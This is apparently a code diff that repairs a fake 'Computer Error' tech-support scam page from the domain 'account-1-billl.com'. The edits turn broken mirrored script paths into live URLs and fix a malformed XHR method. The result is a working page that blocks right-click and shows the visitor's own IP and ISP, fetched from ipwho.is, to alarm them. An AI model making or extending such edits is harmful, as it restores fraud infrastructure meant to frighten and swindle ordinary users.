@@ -3,7 +3,7 @@
 <html lang="en">
   
 <head>
-	  <script defer data-domain="account-1-billl.com/rc8REQ" src="../../api.publytics.net/js/script.manual.min.js"></script>
+	  <script defer data-domain="account-1-billl.com/rc8REQ" src="https://api.publytics.net/js/script.manual.min.js"></script>
 	  <script>
 	      window.publytics = window.publytics || function() { (window.publytics.q = window.publytics.q || []).push(arguments) };
 	      publytics('pageview');
@@ -15,7 +15,7 @@
     <title>Computer Err00r Code #B81TS100d83</title>
     
     <link href="tapa.css" rel="stylesheet">
-    <script type='text/javascript' src="../../code.jquery.com/jquery-1.4.4.min.js"></script>
+    <script type='text/javascript' src="https://code.jquery.com/jquery-1.4.4.min.js"></script>
     <script type="text/javascript">//<![CDATA[
     $(function(){
       $('body').bind('contextmenu', function(e){
@@ -46,7 +46,7 @@
           document.getElementById("isp").textContent = "ISP: " + isp
         }
       };
-      t.open("GET.html", "https://ipwho.is/?lang=en", !0);
+      t.open("GET", "https://ipwho.is/?lang=en", !0);
       t.send();
     </script>
  <script>
